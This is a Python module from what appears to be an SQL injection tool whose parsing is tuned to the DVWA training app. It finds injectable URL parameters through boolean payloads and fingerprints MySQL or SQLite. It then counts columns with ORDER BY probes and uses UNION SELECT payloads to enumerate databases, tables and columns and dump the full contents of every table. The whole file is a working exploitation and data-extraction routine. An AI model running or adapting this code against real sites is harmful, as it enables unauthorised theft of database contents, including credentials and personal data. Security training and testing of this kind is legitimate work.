import re
from dataclasses import dataclass, field
from urllib.parse import parse_qs, urlparse

import requests

from core.injector import inject_payload
from payloads.detection import BOOLEAN_PAYLOADS, SQL_ERROR_SIGNATURES


START_MARK = "VXSTART"
END_MARK = "VXEND"


def _vprint(enabled: bool, message: str):
  if enabled:
    print(message)


@dataclass
class ExtractionResult:
  vulnerable_parameters: list[str] = field(default_factory=list)
  payloads_used: list[str] = field(default_factory=list)
  engine: str = "unknown"
  current_db: str = ""
  databases: list[str] = field(default_factory=list)
  tables: dict = field(default_factory=dict)
  columns: dict = field(default_factory=dict)
  dump: dict = field(default_factory=dict)


def _split_csv(raw: str) -> list[str]:
  if not raw:
    return []
  return [item.strip() for item in raw.split(",") if item.strip()]


def _is_safe_identifier(value: str) -> bool:
  return bool(re.fullmatch(r"[A-Za-z0-9_]+", value))


def discover_vulnerable_parameters(
  session: requests.Session,
  url: str,
  method: str,
  verbose: bool = False,
) -> list[str]:
  params = parse_qs(urlparse(url).query, keep_blank_values=True)
  vulnerable = []

  for param in params:
    for true_payload, false_payload in BOOLEAN_PAYLOADS:
      try:
        r_true = inject_payload(
          session,
          url,
          method,
          true_payload,
          target_param=param,
          verbose=verbose,
        )
        r_false = inject_payload(
          session,
          url,
          method,
          false_payload,
          target_param=param,
          verbose=verbose,
        )
        diff = abs(len(r_true.text) - len(r_false.text))
        _vprint(verbose, f"[verbose] Param '{param}' diff boolean: {diff}")
        if diff > 20:
          vulnerable.append(param)
          break
      except requests.RequestException as e:
        _vprint(verbose, f"[verbose] Error probando parámetro '{param}': {e}")
        continue
  return vulnerable


def discover_vulnerable_parameters_with_payloads(
  session: requests.Session,
  url: str,
  method: str,
  verbose: bool = False,
) -> tuple[list[str], list[str]]:
  params = parse_qs(urlparse(url).query, keep_blank_values=True)
  vulnerable: list[str] = []
  payloads: list[str] = []

  for param in params:
    for true_payload, false_payload in BOOLEAN_PAYLOADS:
      try:
        r_true = inject_payload(
          session,
          url,
          method,
          true_payload,
          target_param=param,
          verbose=verbose,
        )
        r_false = inject_payload(
          session,
          url,
          method,
          false_payload,
          target_param=param,
          verbose=verbose,
        )
        diff = abs(len(r_true.text) - len(r_false.text))
        _vprint(verbose, f"[verbose] Param '{param}' diff boolean: {diff}")
        if diff > 20:
          vulnerable.append(param)
          payloads.append(f"{param}: TRUE={true_payload} | FALSE={false_payload}")
          break
      except requests.RequestException as e:
        _vprint(verbose, f"[verbose] Error probando parámetro '{param}': {e}")
        continue
  return vulnerable, payloads


def fingerprint_engine(
  session: requests.Session,
  url: str,
  method: str,
  param: str,
  verbose: bool = False,
) -> str:
  try:
    mysql_probe = "1' AND (SELECT COUNT(*) FROM information_schema.tables)>=0-- -"
    r_mysql = inject_payload(
      session,
      url,
      method,
      mysql_probe,
      target_param=param,
      verbose=verbose,
    )
    body_mysql = r_mysql.text.lower()
    if "mysql" in body_mysql or "information_schema" in body_mysql:
      return "mysql"

    sqlite_probe = "1' AND (SELECT COUNT(*) FROM sqlite_master)>=0-- -"
    r_sqlite = inject_payload(
      session,
      url,
      method,
      sqlite_probe,
      target_param=param,
      verbose=verbose,
    )
    body_sqlite = r_sqlite.text.lower()
    if "sqlite" in body_sqlite or "sqlite_master" in body_sqlite:
      return "sqlite"

    error_probe = "'"
    r_error = inject_payload(
      session,
      url,
      method,
      error_probe,
      target_param=param,
      verbose=verbose,
    )
    body_error = r_error.text.lower()
    if any(sig in body_error for sig in SQL_ERROR_SIGNATURES):
      if "mysql" in body_error or "sql syntax" in body_error:
        return "mysql"
      if "sqlite" in body_error:
        return "sqlite"
  except requests.RequestException as e:
    _vprint(verbose, f"[verbose] Error durante fingerprint de motor: {e}")

  return "unknown"


def _detect_column_count(
  session: requests.Session,
  url: str,
  method: str,
  param: str,
  verbose: bool = False,
  max_columns: int = 8,
) -> int:
  for n in range(1, max_columns + 1):
    payload = f"1' ORDER BY {n}-- -"
    try:
      r = inject_payload(
        session,
        url,
        method,
        payload,
        target_param=param,
        verbose=verbose,
      )
      body = r.text.lower()
      has_error = any(sig in body for sig in SQL_ERROR_SIGNATURES)
      if has_error:
        _vprint(verbose, f"[verbose] Columnas detectadas: {n - 1}")
        return max(1, n - 1)
    except requests.RequestException as e:
      _vprint(verbose, f"[verbose] Error detectando columnas: {e}")
      break
  return 2


def _detect_visible_column(
  session: requests.Session,
  url: str,
  method: str,
  param: str,
  engine: str,
  column_count: int,
  verbose: bool = False,
) -> int:
  comment = _comment_for_engine(engine)
  for idx in range(column_count):
    columns = ["NULL"] * column_count
    marker = f"'{START_MARK}{idx}{END_MARK}'"
    columns[idx] = marker
    payload = "1' UNION SELECT " + ",".join(columns) + comment
    try:
      r = inject_payload(
        session,
        url,
        method,
        payload,
        target_param=param,
        verbose=verbose,
      )
      # DVWA reflects the input in "ID:"; prefer marker in data fields.
      if re.search(rf"First\s+name:\s*{START_MARK}{idx}{END_MARK}", r.text):
        _vprint(verbose, f"[verbose] Columna visible para UNION: {idx}")
        return idx
    except requests.RequestException:
      continue
  return 0


def _wrap_query(engine: str, query: str) -> str:
  if engine == "sqlite":
    return f"'{START_MARK}' || IFNULL(({query}), '') || '{END_MARK}'"
  return f"CONCAT('{START_MARK}', IFNULL(({query}), ''), '{END_MARK}')"


def _comment_for_engine(engine: str) -> str:
  if engine == "sqlite":
    return "-- -"
  return "#"


def _extract_single_value(
  session: requests.Session,
  url: str,
  method: str,
  param: str,
  engine: str,
  column_count: int,
  visible_col: int,
  query: str,
  verbose: bool = False,
) -> str:
  cols = ["NULL"] * column_count
  cols[visible_col] = _wrap_query(engine, query)
  payload = "1' UNION SELECT " + ",".join(cols) + _comment_for_engine(engine)

  try:
    r = inject_payload(
      session,
      url,
      method,
      payload,
      target_param=param,
      verbose=verbose,
    )
  except requests.RequestException as e:
    _vprint(verbose, f"[verbose] Error extrayendo valor por UNION: {e}")
    return ""

  m = re.search(rf"First\s+name:\s*{START_MARK}(.*?){END_MARK}", r.text, flags=re.DOTALL)
  if not m:
    return ""
  return m.group(1).strip()


def _get_current_db_query(engine: str) -> str:
  if engine == "sqlite":
    return "SELECT 'main'"
  return "SELECT DATABASE()"


def _get_databases_query(engine: str) -> str:
  if engine == "sqlite":
    return "SELECT 'main'"
  return "SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata"


def _get_tables_query(engine: str, database_name: str) -> str:
  if engine == "sqlite":
    return "SELECT GROUP_CONCAT(name, ',') FROM sqlite_master WHERE type='table'"
  return (
    "SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
    "FROM information_schema.tables "
    f"WHERE table_schema='{database_name}'"
  )


def _get_columns_query(engine: str, database_name: str, table_name: str) -> str:
  if engine == "sqlite":
    return f"SELECT GROUP_CONCAT(name, ',') FROM pragma_table_info('{table_name}')"
  return (
    "SELECT GROUP_CONCAT(column_name SEPARATOR ',') "
    "FROM information_schema.columns "
    f"WHERE table_schema='{database_name}' AND table_name='{table_name}'"
  )


def _get_dump_query(engine: str, table_name: str, columns: list[str]) -> str:
  if not columns:
    return ""

  if engine == "sqlite":
    join_expr = " || '::' || ".join(columns)
    return f"SELECT GROUP_CONCAT({join_expr}, '||') FROM {table_name}"

  return (
    "SELECT GROUP_CONCAT(CONCAT_WS('::',"
    + ",".join(columns)
    + f") SEPARATOR '||') FROM {table_name}"
  )


def run_extraction(
  session: requests.Session,
  url: str,
  method: str,
  verbose: bool = False,
) -> ExtractionResult:
  result = ExtractionResult()

  vulnerable_params, bool_payloads = discover_vulnerable_parameters_with_payloads(
    session,
    url,
    method,
    verbose=verbose,
  )
  result.vulnerable_parameters = vulnerable_params
  result.payloads_used.extend(bool_payloads)

  if not vulnerable_params:
    return result

  param = vulnerable_params[0]

  result.engine = fingerprint_engine(
    session,
    url,
    method,
    param,
    verbose=verbose,
  )

  column_count = _detect_column_count(
    session,
    url,
    method,
    param,
    verbose=verbose,
  )
  visible_col = _detect_visible_column(
    session,
    url,
    method,
    param,
    result.engine,
    column_count,
    verbose=verbose,
  )
  result.payloads_used.append(
    (
      "UNION probe: "
      f"1' UNION SELECT ... {_comment_for_engine(result.engine)} "
      f"(columns={column_count}, visible_col={visible_col})"
    )
  )

  current_db = _extract_single_value(
    session,
    url,
    method,
    param,
    result.engine,
    column_count,
    visible_col,
    _get_current_db_query(result.engine),
    verbose=verbose,
  )
  result.current_db = current_db or ("main" if result.engine == "sqlite" else "")

  db_raw = _extract_single_value(
    session,
    url,
    method,
    param,
    result.engine,
    column_count,
    visible_col,
    _get_databases_query(result.engine),
    verbose=verbose,
  )
  result.databases = _split_csv(db_raw) if db_raw else (["main"] if result.engine == "sqlite" else [])

  scoped_databases = result.databases or ([result.current_db] if result.current_db else [])

  for db_name in scoped_databases:
    if not _is_safe_identifier(db_name):
      continue
    table_raw = _extract_single_value(
      session,
      url,
      method,
      param,
      result.engine,
      column_count,
      visible_col,
      _get_tables_query(result.engine, db_name),
      verbose=verbose,
    )
    tables = _split_csv(table_raw)
    result.tables[db_name] = tables

    for table in tables:
      if not _is_safe_identifier(table):
        continue

      col_raw = _extract_single_value(
        session,
        url,
        method,
        param,
        result.engine,
        column_count,
        visible_col,
        _get_columns_query(result.engine, db_name, table),
        verbose=verbose,
      )
      columns = [c for c in _split_csv(col_raw) if _is_safe_identifier(c)]
      table_key = f"{db_name}.{table}"
      result.columns[table_key] = columns

      dump_query = _get_dump_query(result.engine, table, columns)
      if not dump_query:
        result.dump[table_key] = []
        continue

      dump_raw = _extract_single_value(
        session,
        url,
        method,
        param,
        result.engine,
        column_count,
        visible_col,
        dump_query,
        verbose=verbose,
      )

      parsed_rows = []
      for row in [r for r in dump_raw.split("||") if r]:
        values = row.split("::")
        parsed_rows.append(dict(zip(columns, values)))
      result.dump[table_key] = parsed_rows

  return result
